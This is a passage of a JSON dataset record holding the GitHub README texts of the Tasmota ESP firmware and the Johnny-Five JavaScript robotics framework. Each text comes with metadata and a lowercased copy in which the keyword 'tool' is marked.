{"interestingcomments": [{"Unnamed: 0": 5, "autor": 5, "date": null, "content": "Alternative firmware for ESP8266 and ESP32 based devices with easy configuration using webUI, OTA updates, automation using timers or rules, expandability and entirely local control over MQTT, HTTP, Serial or KNX. Written for PlatformIO with limited support for Arduino IDE.\nIf you like Tasmota, give it a star, or fork it and contribute!\nSee RELEASENOTES.md for release information.\nFirmware binaries can be downloaded from http://ota.tasmota.com/tasmota/release/ or http://ota.tasmota.com/tasmota32/release/ for ESP32 binaries.\nEasy initial installation of Tasmota can be performed using the Tasmota WebInstaller.\nDevelopment\nSee CHANGELOG.md for detailed change information.\nUnless your Tasmota powered device exhibits a problem or you need to make use of a feature that is not available in the Tasmota version currently installed on your device, leave your device alone - it works so don't make unnecessary changes! If the release version (i.e., the master branch) exhibits unexpected behaviour for your device and configuration, you should upgrade to the latest development version instead to see if your problem is resolved as some bugs in previous releases or development builds may already have been resolved.\nEvery commit made to the development branch, which is compiling successfuly, will post new binary files at http://ota.tasmota.com/tasmota/ (this web address can be used for OTA updates too). It is important to note that these binaries are based on the current development codebase. These commits are tested as much as is possible and are typically quite stable. However, it is infeasible to test on the hundreds of different types of devices with all the available configuration options permitted.\nNote that there is a chance, as with any upgrade, that the device may not function as expected. You must always account for the possibility that you may need to flash the device via the serial programming interface if the OTA upgrade fails. Even with the master release, you should always attempt to test the device or a similar prototype before upgrading a device which is in production or is hard to reach. And, as always, make a backup of the device configuration before beginning any firmware update.\nDisclaimer\n\u26a0\ufe0f DANGER OF ELECTROCUTION \u26a0\ufe0f\nIf your device connects to mains electricity (AC power) there is danger of electrocution if not installed properly. If you don't know how to install it, please call an electrician (Beware: certain countries prohibit installation without a licensed electrician present). Remember: SAFETY FIRST. It is not worth the risk to yourself, your family and your home if you don't know exactly what you are doing. Never tinker or try to flash a device using the serial programming interface while it is connected to MAINS ELECTRICITY (AC power).\nWe don't take any responsibility nor liability for using this software nor for the installation or any tips, advice, videos, etc. given by any member of this site or any related site.\nNote\nPlease do not ask to add new devices unless it requires additional code for new features. If the device is not listed as a module, try using Templates first. If it is not listed in the Tasmota Device Templates Repository create your own Template.\nQuick Install\nDownload one of the released binaries from http://ota.tasmota.com/tasmota/release/ or http://ota.tasmota.com/tasmota32/release/ and flash it to your hardware using our installation guide.\nImportant User Compilation Information\nIf you want to compile Tasmota yourself keep in mind the following:\nFor ESP8285 based devices only Flash Mode DOUT is supported. Do not use Flash Mode DIO / QIO / QOUT as it might seem to brick your device.\nFor ESP8285 based devices Tasmota uses a 1M linker script WITHOUT spiffs 1M (no SPIFFS) for optimal code space.\nTo make compile time changes to Tasmota use the user_config_override.h file. It assures keeping your custom settings when you download and compile a new version. You have to make a copy from the provided user_config_override_sample.h file and add your setting overrides.\nConfiguration Information\nPlease refer to the installation and configuration articles in our documentation.\nMigration Information\nSee wiki migration path for instructions how to migrate to a major version. Pay attention to the following version breaks due to dynamic settings updates:\nMigrate to Sonoff-Tasmota 3.9.x\nMigrate to Sonoff-Tasmota 4.x\nMigrate to Sonoff-Tasmota 5.14\nMigrate to Sonoff-Tasmota 6.7.1 (http://ota.tasmota.com/tasmota/release-6.7.1/)\nMigrate to Tasmota 7.2.0 (http://ota.tasmota.com/tasmota/release-7.2.0/)\n--- Major change in parameter storage layout ---\nMigrate to Tasmota 8.5.1 (http://ota.tasmota.com/tasmota/release-8.5.1/)\n--- Major change in internal GPIO function representation ---\nMigrate to Tasmota 9.1 (http://ota.tasmota.com/tasmota/release-9.1.0/)\nWhile fallback or downgrading is common practice it was never supported due to Settings additions or changes in newer releases. Starting with version v9.0.0.1 the internal GPIO function representation has changed in such a way that fallback is only possible to the latest GPIO configuration before installing v9.0.0.1.\nSupport Information\nFor a database of supported devices see Tasmota Device Templates Repository\nIf you're looking for support on Tasmota there are some options available:\nDocumentation\nDocumentation Site: For information on how to flash Tasmota, configure, use and expand it\nFAQ and Troubleshooting: For information on common problems and solutions.\nCommands Information: For information on all the commands supported by Tasmota.\nSupport's Community\nTasmota Discussions: For Tasmota usage questions, Feature Requests and Projects.\nTasmota Users Chat: For support, troubleshooting and general questions. You have better chances to get fast answers from members of the Tasmota Community.\nSearch in Issues: You might find an answer to your question by searching current or closed issues.\nSoftware Problem Report: For reporting problems of Tasmota Software.\nContribute\nYou can contribute to Tasmota by\nProviding Pull Requests (Features, Proof of Concepts, Language files or Fixes)\nTesting new released features and report issues\nDonating to acquire hardware for testing and implementing or out of gratitude\nContributing missing documentation for features and devices\nCredits\nPeople helping to keep the show on the road:\nDavid Lang providing initial issue resolution and code optimizations\nHeiko Krupp for his IRSend, HTU21, SI70xx and Wemo/Hue emulation drivers\nWiktor Schmidt for Travis CI implementation\nThom Dietrich for PlatformIO optimizations\nMarinus van den Broek for his EspEasy groundwork\nPete Ba for more user friendly energy monitor calibration\nLobradov providing compile optimization tips\nFlexiti for his initial timer implementation\nreloxx13 for his TasmoAdmin management tool\nJoachim Banzhaf for his TSL2561 library and driver\nAndre Thomas for providing many drivers\nGijs Noorlander for his MHZ19, SenseAir and updated PubSubClient drivers\nErik Montnemery for his HomeAssistant Discovery concept and many code tuning tips\nFederico Leoni for continued HomeAssistant Discovery support\nAidan Mountford for his HSB support\nDaniel Ztolnai for his Serial Bridge implementation\nGerhard Mutz for multiple sensor & display drivers, Sunrise/Sunset, and scripting\nNuno Ferreira for his HC-SR04 driver\nAdrian Scillato for his (security)fixes and implementing and maintaining KNX\nGennaro Tortone for implementing and maintaining Eastron drivers\nRaymond Mouthaan for managing Wemos Wiki information\nNorbert Richter for his decode-config.py tool\nJoel Stein, digiblur and Shantur Rathore for their Tuya research and driver\nFrogmore42 for providing many issue answers\nJason2866 for platformio support and providing many issue answers\nBlakadder for managing the new document site and providing template management\nStephan Hadinger for refactoring light driver, enhancing HueEmulation, LVGL, Zigbee and Berry support\ntmo for designing the official Tasmota logo\nStefan Bode for his Shutter and Deep sleep drivers\nJacek Zi\u00f3\u0142kowski for his TDM management tool and Tasmotizer flashing tool\nChristian Staars for NRF24L01 and HM-10 Bluetooth sensor support\nPaul Diem for UDP Group communication support\nJ\u00f6rg Sch\u00fcler-Maroldt for his initial ESP32 port\nJavier Arigita for his thermostat driver\nMany more providing Tips, Wips, Pocs, PRs and Donations\nLicense\nThis program is licensed under GPL-3.0", "link": "https://github.com/arendst/Tasmota", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "alternative firmware for esp8266 and esp32 based devices with easy configuration using webui, ota updates, automation using timers or rules, expandability and entirely local control over mqtt, http, serial or knx. written for platformio with limited support for arduino ide.\nif you like tasmota, give it a star, or fork it and contribute!\nsee releasenotes.md for release information.\nfirmware binaries can be downloaded from http://ota.tasmota.com/tasmota/release/ or http://ota.tasmota.com/tasmota32/release/ for esp32 binaries.\neasy initial installation of tasmota can be performed using the tasmota webinstaller.\ndevelopment\nsee changelog.md for detailed change information.\nunless your tasmota powered device exhibits a problem or you need to make use of a feature that is not available in the tasmota version currently installed on your device, leave your device alone - it works so don't make unnecessary changes! if the release version (i.e., the master branch) exhibits unexpected behaviour for your device and configuration, you should upgrade to the latest development version instead to see if your problem is resolved as some bugs in previous releases or development builds may already have been resolved.\nevery commit made to the development branch, which is compiling successfuly, will post new binary files at http://ota.tasmota.com/tasmota/ (this web address can be used for ota updates too). it is important to note that these binaries are based on the current development codebase. these commits are tested as much as is possible and are typically quite stable. however, it is infeasible to test on the hundreds of different types of devices with all the available configuration options permitted.\nnote that there is a chance, as with any upgrade, that the device may not function as expected. you must always account for the possibility that you may need to flash the device via the serial programming interface if the ota upgrade fails. even with the master release, you should always attempt to test the device or a similar prototype before upgrading a device which is in production or is hard to reach. and, as always, make a backup of the device configuration before beginning any firmware update.\ndisclaimer\n\u26a0\ufe0f danger of electrocution \u26a0\ufe0f\nif your device connects to mains electricity (ac power) there is danger of electrocution if not installed properly. if you don't know how to install it, please call an electrician (beware: certain countries prohibit installation without a licensed electrician present). remember: safety first. it is not worth the risk to yourself, your family and your home if you don't know exactly what you are doing. never tinker or try to flash a device using the serial programming interface while it is connected to mains electricity (ac power).\nwe don't take any responsibility nor liability for using this software nor for the installation or any tips, advice, videos, etc. given by any member of this site or any related site.\nnote\nplease do not ask to add new devices unless it requires additional code for new features. if the device is not listed as a module, try using templates first. if it is not listed in the tasmota device templates repository create your own template.\nquick install\ndownload one of the released binaries from http://ota.tasmota.com/tasmota/release/ or http://ota.tasmota.com/tasmota32/release/ and flash it to your hardware using our installation guide.\nimportant user compilation information\nif you want to compile tasmota yourself keep in mind the following:\nfor esp8285 based devices only flash mode dout is supported. do not use flash mode dio / qio / qout as it might seem to brick your device.\nfor esp8285 based devices tasmota uses a 1m linker script without spiffs 1m (no spiffs) for optimal code space.\nto make compile time changes to tasmota use the user_config_override.h file. it assures keeping your custom settings when you download and compile a new version. you have to make a copy from the provided user_config_override_sample.h file and add your setting overrides.\nconfiguration information\nplease refer to the installation and configuration articles in our documentation.\nmigration information\nsee wiki migration path for instructions how to migrate to a major version. pay attention to the following version breaks due to dynamic settings updates:\nmigrate to sonoff-tasmota 3.9.x\nmigrate to sonoff-tasmota 4.x\nmigrate to sonoff-tasmota 5.14\nmigrate to sonoff-tasmota 6.7.1 (http://ota.tasmota.com/tasmota/release-6.7.1/)\nmigrate to tasmota 7.2.0 (http://ota.tasmota.com/tasmota/release-7.2.0/)\n--- major change in parameter storage layout ---\nmigrate to tasmota 8.5.1 (http://ota.tasmota.com/tasmota/release-8.5.1/)\n--- major change in internal gpio function representation ---\nmigrate to tasmota 9.1 (http://ota.tasmota.com/tasmota/release-9.1.0/)\nwhile fallback or downgrading is common practice it was never supported due to settings additions or changes in newer releases. starting with version v9.0.0.1 the internal gpio function representation has changed in such a way that fallback is only possible to the latest gpio configuration before installing v9.0.0.1.\nsupport information\nfor a database of supported devices see tasmota device templates repository\nif you're looking for support on tasmota there are some options available:\ndocumentation\ndocumentation site: for information on how to flash tasmota, configure, use and expand it\nfaq and troubleshooting: for information on common problems and solutions.\ncommands information: for information on all the commands supported by tasmota.\nsupport's community\ntasmota discussions: for tasmota usage questions, feature requests and projects.\ntasmota users chat: for support, troubleshooting and general questions. you have better chances to get fast answers from members of the tasmota community.\nsearch in issues: you might find an answer to your question by searching current or closed issues.\nsoftware problem report: for reporting problems of tasmota software.\ncontribute\nyou can contribute to tasmota by\nproviding pull requests (features, proof of concepts, language files or fixes)\ntesting new released features and report issues\ndonating to acquire hardware for testing and implementing or out of gratitude\ncontributing missing documentation for features and devices\ncredits\npeople helping to keep the show on the road:\ndavid lang providing initial issue resolution and code optimizations\nheiko krupp for his irsend, htu21, si70xx and wemo/hue emulation drivers\nwiktor schmidt for travis ci implementation\nthom dietrich for platformio optimizations\nmarinus van den broek for his espeasy groundwork\npete ba for more user friendly energy monitor calibration\nlobradov providing compile optimization tips\nflexiti for his initial timer implementation\nreloxx13 for his tasmoadmin management -----> tool !!! \njoachim banzhaf for his tsl2561 library and driver\nandre thomas for providing many drivers\ngijs noorlander for his mhz19, senseair and updated pubsubclient drivers\nerik montnemery for his homeassistant discovery concept and many code tuning tips\nfederico leoni for continued homeassistant discovery support\naidan mountford for his hsb support\ndaniel ztolnai for his serial bridge implementation\ngerhard mutz for multiple sensor & display drivers, sunrise/sunset, and scripting\nnuno ferreira for his hc-sr04 driver\nadrian scillato for his (security)fixes and implementing and maintaining knx\ngennaro tortone for implementing and maintaining eastron drivers\nraymond mouthaan for managing wemos wiki information\nnorbert richter for his decode-config.py -----> tool !!! \njoel stein, digiblur and shantur rathore for their tuya research and driver\nfrogmore42 for providing many issue answers\njason2866 for platformio support and providing many issue answers\nblakadder for managing the new document site and providing template management\nstephan hadinger for refactoring light driver, enhancing hueemulation, lvgl, zigbee and berry support\ntmo for designing the official tasmota logo\nstefan bode for his shutter and deep sleep drivers\njacek zi\u00f3\u0142kowski for his tdm management -----> tool !!!  and tasmotizer flashing -----> tool !!! \nchristian staars for nrf24l01 and hm-10 bluetooth sensor support\npaul diem for udp group communication support\nj\u00f6rg sch\u00fcler-maroldt for his initial esp32 port\njavier arigita for his thermostat driver\nmany more providing tips, wips, pocs, prs and donations\nlicense\nthis program is licensed under gpl-3.0", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000005, "year": null}, {"Unnamed: 0": 7, "autor": 7, "date": null, "content": "Johnny-Five\nThe JavaScript Robotics Programming Framework\nArtwork by Mike Sgier\nJohnny-Five is an Open Source, Firmata Protocol based, IoT and Robotics programming framework, developed by the Nodebots Community. Johnny-Five programs can be written for Arduino (all models), Electric Imp, Beagle Bone, Intel Galileo & Edison, Linino One, Pinoccio, pcDuino3, Raspberry Pi, Particle/Spark Core & Photon, Tessel 2, TI Launchpad and more!\nJohnny-Five has grown from a passion project into a tool for inspiring learning and creativity for people of all ages, backgrounds, and from all across the world.\nJust interested in learning and building awesome things? You might want to start with the official Johnny-Five website.\nIf you want to find the API documentation, that\u2019s right here.\nNeed to figure out what platform to use for a project? We put that stuff here.\nNeed inspiration for your next NodeBot? Check out the examples.\nWant to stay up-to-date with projects in the community? Check this out.\nNeed NodeBots community or Johnny-Five project updates and announcements? This is what you\u2019re looking for.\nJohnny-Five does not attempt to provide \"all the things\", but instead focuses on delivering robust, reality tested, highly composable APIs that behave consistently across all supported hardware platforms. Johnny-Five wants to be a baseline control kit for hardware projects, allowing you the freedom to build, grow and experiment with diverse JavaScript libraries of your own choice. Johnny-Five couples comfortably with:\nPopular application libraries such as Express.js and Socket.io.\nFellow hardware projects like ar-drone, Aerogel and Spheron\nBluetooth game controllers like XBox Controller and DualShock\nIoT frameworks, such as Octoblu\n...And that's only a few of the many explorable possibilities. Check out these exciting projects: node-pulsesensor, footballbot-workshop-ui, nodebotui, dublin-disco, node-slot-car-bot, servo-calibrator, node-ardx, nodebot-workshop, phone-home, purple-unicorn, webduino, leapduino, lasercat-workshop, simplesense, five-redbot, robotnik, the-blender\nWhy JavaScript? NodeBots: The Rise of JavaScript Robotics\nHello Johnny\nThe ubiquitous \"Hello World\" program of the microcontroller and SoC world is \"blink an LED\". The following code demonstrates how this is done using the Johnny-Five framework.\nconst { Board, Led } = require(\"johnny-five\");\nconst board = new Board();\nboard.on(\"ready\", () => {\n// Create an Led on pin 13\nconst led = new Led(13);\n// Blink every half second\nled.blink(500);\n});\nNote: Node will crash if you try to run johnny-five in the node REPL, but board instances will create their own contextual REPL. Put your script in a file.\nSupported Hardware\nJohnny-Five has been tested on a variety of Arduino-compatible Boards.\nFor non-Arduino based projects, a number of platform-specific IO Plugins are available. IO Plugins allow Johnny-Five code to communicate with any non-Arduino based hardware in whatever language that platforms speaks!\nDocumentation\nDocumentation for the Johnny-Five API can be found here and example programs here.\nGuidance\nNeed help? Ask a question on the NodeBots Community Forum. If you just have a quick question or are interested in ongoing design discussions, join us in the Johnny-Five Gitter Chat.\nFor step-by-step examples, including an electronics primer, check out Arduino Experimenter's Guide for NodeJS by @AnnaGerber\nHere is a list of prerequisites for Linux, OSX or Windows.\nCheck out the bluetooth guide if you want to remotely control your robot.\nSetup and Assemble Arduino\nRecommended Starting Kit: Sparkfun Inventor's Kit\nDownload Arduino IDE\nPlug in your Arduino or Arduino compatible microcontroller via USB\nOpen the Arduino IDE, select: File > Examples > Firmata > StandardFirmataPlus\nStandardFirmataPlus is available in Firmata v2.5.0 or greater\nClick the \"Upload\" button.\nIf the upload was successful, the board is now prepared and you can close the Arduino IDE.\nFor non-Arduino projects, each IO Plugin's repo will provide its own platform specific setup instructions.\nHey you, here's Johnny!\nSource Code:\ngit clone git://github.com/rwaldron/johnny-five.git && cd johnny-five\nnpm install\nnpm package:\nInstall the module with:\nnpm install johnny-five\nExample Programs\nTo get you up and running quickly, we provide a variety of examples for using each Johnny-Five component. One thing we\u2019re especially excited about is the extensive collection of Fritzing diagrams you\u2019ll find throughout the site. A huge part of doing any Johnny-Five project is handling the actual hardware, and we\u2019ve included these as part of the documentation because we realised that instructions on how to write code to control a servo are insufficient without instructions on how to connect a servo!\nTo interactively navigate the examples, visit the Johnny-Five examples page on the official website. If you want to link directly to the examples in this repo, you can use one of the following links.\nThere are presently 362 example programs with code and diagrams!\nBoard\nBoard - Basic Initialization\nBoard - Cleanup in 'exit' event\nBoard - Multiple in one program\nBoard - Specify Sampling Interval\nBoard - Specify port\nCustom Data Properties\nPin\nREPL\nLED\nLED\nLED - Blink\nLED - Demo sequence\nLED - Fade\nLED - Fade callback\nLED - Fade with animation\nLED - PCA9685\nLED - Pulse\nLED - Pulse with animation\nLED - Slider\nLED - Tessel Servo Module\nLEDs - An array of LEDs\nLEDs - Controlling an array of LEDs\nLED: RGB\nLED - RGB (Common Anode)\nLED - RGB (Common Anode) PCA9685\nLED - RGB Intensity\nLED - Rainbow\nLED - Rainbow BlinkM\nLED: Digits & Matrix\nLED - Digital Clock\nLED - Digital Clock, Dual Displays\nLED - Digital Clock, HT16K33\nLED - Draw Matrix Characters Demo\nLED - Enumerate Matrix Characters & Symbols\nLED - Matrix\nLED - Matrix Demo\nLED - Matrix HT16K33\nLED - Matrix HT16K33 16x8\nServo\nServo\nServo - Continuous\nServo - Drive\nServo - Multi-Turn\nServo - PCA9685\nServo - Prompt\nServo - Slider control\nServo - Tessel Servo Module\nServos - An array of servos\nGPS\nGPS - Adafruit Ultimate GPS Breakout\nGPS - Default GPS\nGPS - Hardware Serial\nGPS - Sparkfun GP-20U7\nServo Animation\nServo - Animation\nServo - Leg Animation\nColor\nColor - EVShield EV3 (Code)\nColor - EVShield EV3 (Raw)\nColor - EVShield NXT (Code)\nColor - ISL29125\nMotor\nMotor\nMotor - 3 pin\nMotor - Adafruit DRV8871 DC Motor Driver Breakout\nMotor - Brake\nMotor - Current\nMotor - Directional\nMotor - EVShield EV3\nMotor - EVShield NXT\nMotor - Enable Pin\nMotor - GROVE_I2C_MOTOR_DRIVER\nMotor - H-Bridge\nMotor - LUDUS\nMotor - PCA9685\nMotor - Pololu VNH5019 Dual Motor Driver Breakout\nMotor - Sparkfun Dual H-bridge Edison Block\nMotor - Sparkfun TB6612FNG\nMotor - l298 Breakout\nMotors - Dual H-Bridge\nStepper Motor\nStepper - Driver\nStepper - Four Wire\nStepper - Sweep\nESC & Brushless Motor\nESC - Bidirectional\nESC - Keypress controlled ESCs\nESC - PCA9685\nButton / Switch\nButton\nButton - Bumper\nButton - EVShield EV3\nButton - EVShield NXT\nButton - Options\nButton - Pullup\nButtons - Collection w/ AT42QT1070\nSwitch\nSwitch - Magnetic Door\nSwitch - Tilt SW-200D\nToggle Switch\nKeypad\nKeypad - 3x4 I2C Nano Backpack\nKeypad - 4x4 I2C Nano Backpack\nKeypad - VKEY\nKeypad - Waveshare AD\nTouchpad - Grove QTouch\nTouchpad - MPR121\nTouchpad - MPR121, Sensitivity\nTouchpad - MPR121QR2_SHIELD\nTouchpad - MPR121_KEYPAD\nTouchpad - MPR121_SHIELD\nRelay\nRelay\nRelay - Collection\nRelay On Analog Pin\nShift Register\nShift Register\nShift Register - Common Anode Seven Segment controller\nShift Register - Common Anode Seven segments, Chained\nShift Register - Seven Segment controller\nShift Register - Seven segments, Chained\nInfrared Reflectance\nIR Motion\nIR Proximity\nIR Reflectance\nIR Reflectance Array\nProximity\nProximity\nProximity - EVShield EV3 (IR)\nProximity - EVShield EV3 (IR)\nProximity - EVShield EV3 (Ultrasonic)\nProximity - EVShield EV3 (Ultrasonic)\nProximity - GP2Y0A710K0F\nProximity - HC-SR04\nProximity - HC-SR04 (Analog)\nProximity - HC-SR04 I2C Backpack\nProximity - LIDAR-Lite\nProximity - MB1000\nProximity - MB1003\nProximity - MB1010\nProximity - MB1230\nProximity - SRF10\nMotion\nMotion\nMotion - GP2Y0A60SZLF\nMotion - GP2Y0D805Z0F\nMotion - GP2Y0D810Z0F\nMotion - GP2Y0D810Z0F\nJoystick\nJoystick\nJoystick - Esplora\nJoystick - Pan + Tilt control\nJoystick - Sparkfun Shield\nLCD\nGrove - RGB LCD Color Previewer\nLCD\nLCD - Enumerate characters\nLCD - I2C\nLCD - I2C PCF8574\nLCD - I2C Runner\nLCD - Runner 16x2\nLCD - Runner 20x4\nLCD - Tessel 2 16x2\nTessel 2 + Grove - RGB LCD Color Previewer\nTessel 2 + Grove - RGB LCD Display\nCompass/Magnetometer\nCompass - Find north\nCompass - HMC5883L\nCompass - HMC6352\nCompass - Logger\nCompass - MAG3110\nCompass - MAG3110 on Tessel 2\nCompass / Magnetometer\nPiezo\nPiezo\nIMU/Multi\nIMU - BNO055\nIMU - BNO055 (Orientation)\nIMU - LSM303C\nIMU - MPU6050\nMulti - BME280\nMulti - BMP085\nMulti - BMP180\nMulti - DHT11_I2C_NANO_BACKPACK\nMulti - DHT21_I2C_NANO_BACKPACK\nMulti - DHT22_I2C_NANO_BACKPACK\nMulti - HIH6130\nMulti - HTU21D\nMulti - MPL115A2\nMulti - MPL3115A2\nMulti - MS5611\nMulti - SHT31D\nMulti - SI7020\nMulti - SI7021\nMulti - TH02\nSensors\nAccelerometer\nAccelerometer - ADXL335\nAccelerometer - ADXL345\nAccelerometer - LIS3DH\nAccelerometer - MMA7361\nAccelerometer - MMA8452\nAccelerometer - MPU6050\nAccelerometer - Pan + Tilt\nAltimeter - BMP085\nAltimeter - BMP180\nAltimeter - MPL3115A2\nAltimeter - MS5611\nBarometer - BMP085\nBarometer - BMP180\nBarometer - MPL115A2\nBarometer - MPL3115A2\nBarometer - MS5611\nGyro\nGyro - Analog LPR5150AL\nGyro - I2C MPU6050\nHygrometer - DHT11_I2C_NANO_BACKPACK\nHygrometer - DHT21_I2C_NANO_BACKPACK\nHygrometer - DHT22_I2C_NANO_BACKPACK\nHygrometer - HIH6130\nHygrometer - HTU21D\nHygrometer - SHT31D\nHygrometer - SI7021\nHygrometer - TH02\nSensor\nSensor - Digital Microwave\nSensor - Flex sensor\nSensor - Force sensitive resistor\nSensor - Microphone\nSensor - Photoresistor\nSensor - Potentiometer\nSensor - Slide potentiometer\nThermometer - BMP085\nThermometer - BMP180\nThermometer - DHT11_I2C_NANO_BACKPACK\nThermometer - DHT21_I2C_NANO_BACKPACK\nThermometer - DHT22_I2C_NANO_BACKPACK\nThermometer - DS18B20\nThermometer - Dual DS18B20\nThermometer - HIH6130\nThermometer - HTU21D\nThermometer - LM335\nThermometer - LM35\nThermometer - MAX31850\nThermometer - MCP9808\nThermometer - MPL115A2\nThermometer - MPL3115A2\nThermometer - MPU6050\nThermometer - MS5611\nThermometer - SHT31D\nThermometer - SI7020\nThermometer - SI7021\nThermometer - TH02\nThermometer - TMP102\nThermometer - TMP36\nExpander\nExpander - 74HC595\nExpander - CD74HC4067, 16 Channel Analog Input Breakout\nExpander - LIS3DH\nExpander - MCP23008\nExpander - MCP23017\nExpander - MUXSHIELD2, Analog Sensors\nExpander - MUXSHIELD2, Digital Input and Output\nExpander - PCA9685\nExpander - PCF8574\nExpander - PCF8575\nExpander - PCF8591\nPhoton Weather Shield\nPhoton Weather Shield: Moisture\nLego EVShield\nButton - EVShield EV3\nButton - EVShield NXT\nColor - EVShield EV3 (Code)\nColor - EVShield EV3 (Raw)\nColor - EVShield NXT (Code)\nLight - BH1750\nLight - EVShield EV3 (Ambient)\nLight - EVShield EV3 (Reflected)\nLight - EVShield NXT (Ambient)\nLight - EVShield NXT (Reflected)\nLight - TSL2561\nMotor - EVShield EV3\nMotor - EVShield NXT\nProximity - EVShield EV3 (IR)\nProximity - EVShield EV3 (Ultrasonic)\nIntel Edison + Grove IoT Kit\nIntel Edison + Grove - Accelerometer (ADXL345)\nIntel Edison + Grove - Accelerometer (MMA7660)\nIntel Edison + Grove - Air quality sensor\nIntel Edison + Grove - Barometer (BMP180)\nIntel Edison + Grove - Button\nIntel Edison + Grove - Compass (HMC588L)\nIntel Edison + Grove - Flame Sensor\nIntel Edison + Grove - Gas (MQ2)\nIntel Edison + Grove - Humidity & Temperature (TH02)\nIntel Edison + Grove - I2C Motor Driver\nIntel Edison + Grove - Joystick\nIntel Edison + Grove - LED\nIntel Edison + Grove - Light Sensor (TSL2561)\nIntel Edison + Grove - Moisture Sensor\nIntel Edison + Grove - Q Touch\nIntel Edison + Grove - RGB LCD\nIntel Edison + Grove - RGB LCD Color Previewer\nIntel Edison + Grove - RGB LCD temperature display\nIntel Edison + Grove - Relay\nIntel Edison + Grove - Rotary Potentiometer\nIntel Edison + Grove - Servo\nIntel Edison + Grove - Touch\nGrove IoT Kit (Seeed Studio)\nGrove - Button\nGrove - Joystick\nGrove - LED\nGrove - Motor (I2C Driver)\nGrove - RGB LCD\nGrove - RGB LCD temperature display\nGrove - Rotary Potentiometer\nGrove - Servo\nGrove - Touch\nMicro Magician V2\nMicro Magician V2 - Accelerometer\nMicro Magician V2 - Motor\nMicro Magician V2 - Servo\nTinkerKit\nTinkerKit - Accelerometer\nTinkerKit - Blink\nTinkerKit - Button\nTinkerKit - Combo\nTinkerKit - Continuous servo\nTinkerKit - Gyro\nTinkerKit - Joystick\nTinkerKit - Linear potentiometer\nTinkerKit - Rotary potentiometer\nTinkerKit - Temperature\nTinkerKit - Tilt\nTinkerKit - Touch\nWii\nWii Classic Controller\nWii Nunchuck\nComplete Bots / Projects\nBug\nKinect Robotic Arm Controller\nLaser Trip Wire\nLine Follower\nLynxmotion Biped BRAT\nMotobot\nNavigator\nNodebot\nPhoenix Hexapod\nRadar\nRobotic Claw\nWhisker\nComponent Plugin Template\nExample plugin\nIO Plugins\nLed Blink on Electric Imp\nLed Blink on Intel Edison Arduino Board\nLed Blink on Intel Edison Mini Board\nLed Blink on Intel Galileo Gen 2\nLed Blink on Raspberry Pi\nLed Blink on Spark Core\nLed Blink on pcDuino3\nMany fragments. Some large, some small.\nWireless Nodebot\nKinect Controlled Robot Arm\nBiped Nodebot\nLCD Running Man\nSlider Controlled Panning Servo\nJoystick Controlled Laser (pan/tilt) 1\nJoystick Controlled Laser (pan/tilt) 2\nJoystick Controlled Claw\nRobot Claw\nJoystick, Motor & Led\nBuild you own drone\nMake: JavaScript Robotics\nContributing\nAll contributions must adhere to the Idiomatic.js Style Guide, by maintaining the existing coding style. Add unit tests for any new or changed functionality. Lint and test your code using grunt.\nLicense\nCopyright (c) 2012, 2013, 2014 Rick Waldron waldron.rick@gmail.com Licensed under the MIT license. Copyright (c) 2014, 2015 The Johnny-Five Contributors Licensed under the MIT license.", "link": "https://github.com/rwaldron/johnny-five", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "johnny-five\nthe javascript robotics programming framework\nartwork by mike sgier\njohnny-five is an open source, firmata protocol based, iot and robotics programming framework, developed by the nodebots community. johnny-five programs can be written for arduino (all models), electric imp, beagle bone, intel galileo & edison, linino one, pinoccio, pcduino3, raspberry pi, particle/spark core & photon, tessel 2, ti launchpad and more!\njohnny-five has grown from a passion project into a -----> tool !!!  for inspiring learning and creativity for people of all ages, backgrounds, and from all across the world.\njust interested in learning and building awesome things? you might want to start with the official johnny-five website.\nif you want to find the api documentation, that\u2019s right here.\nneed to figure out what platform to use for a project? we put that stuff here.\nneed inspiration for your next nodebot? check out the examples.\nwant to stay up-to-date with projects in the community? check this out.\nneed nodebots community or johnny-five project updates and announcements? this is what you\u2019re looking for.\njohnny-five does not attempt to provide \"all the things\", but instead focuses on delivering robust, reality tested, highly composable apis that behave consistently across all supported hardware platforms. johnny-five wants to be a baseline control kit for hardware projects, allowing you the freedom to build, grow and experiment with diverse javascript libraries of your own choice. johnny-five couples comfortably with:\npopular application libraries such as express.js and socket.io.\nfellow hardware projects like ar-drone, aerogel and spheron\nbluetooth game controllers like xbox controller and dualshock\niot frameworks, such as octoblu\n...and that's only a few of the many explorable possibilities. check out these exciting projects: node-pulsesensor, footballbot-workshop-ui, nodebotui, dublin-disco, node-slot-car-bot, servo-calibrator, node-ardx, nodebot-workshop, phone-home, purple-unicorn, webduino, leapduino, lasercat-workshop, simplesense, five-redbot, robotnik, the-blender\nwhy javascript? nodebots: the rise of javascript robotics\nhello johnny\nthe ubiquitous \"hello world\" program of the microcontroller and soc world is \"blink an led\". the following code demonstrates how this is done using the johnny-five framework.\nconst { board, led } = require(\"johnny-five\");\nconst board = new board();\nboard.on(\"ready\", () => {\n// create an led on pin 13\nconst led = new led(13);\n// blink every half second\nled.blink(500);\n});\nnote: node will crash if you try to run johnny-five in the node repl, but board instances will create their own contextual repl. put your script in a file.\nsupported hardware\njohnny-five has been tested on a variety of arduino-compatible boards.\nfor non-arduino based projects, a number of platform-specific io plugins are available. io plugins allow johnny-five code to communicate with any non-arduino based hardware in whatever language that platforms speaks!\ndocumentation\ndocumentation for the johnny-five api can be found here and example programs here.\nguidance\nneed help? ask a question on the nodebots community forum. if you just have a quick question or are interested in ongoing design discussions, join us in the johnny-five gitter chat.\nfor step-by-step examples, including an electronics primer, check out arduino experimenter's guide for nodejs by @annagerber\nhere is a list of prerequisites for linux, osx or windows.\ncheck out the bluetooth guide if you want to remotely control your robot.\nsetup and assemble arduino\nrecommended starting kit: sparkfun inventor's kit\ndownload arduino ide\nplug in your arduino or arduino compatible microcontroller via usb\nopen the arduino ide, select: file > examples > firmata > standardfirmataplus\nstandardfirmataplus is available in firmata v2.5.0 or greater\nclick the \"upload\" button.\nif the upload was successful, the board is now prepared and you can close the arduino ide.\nfor non-arduino projects, each io plugin's repo will provide its own platform specific setup instructions.\nhey you, here's johnny!\nsource code:\ngit clone git://github.com/rwaldron/johnny-five.git && cd johnny-five\nnpm install\nnpm package:\ninstall the module with:\nnpm install johnny-five\nexample programs\nto get you up and running quickly, we provide a variety of examples for using each johnny-five component. one thing we\u2019re especially excited about is the extensive collection of fritzing diagrams 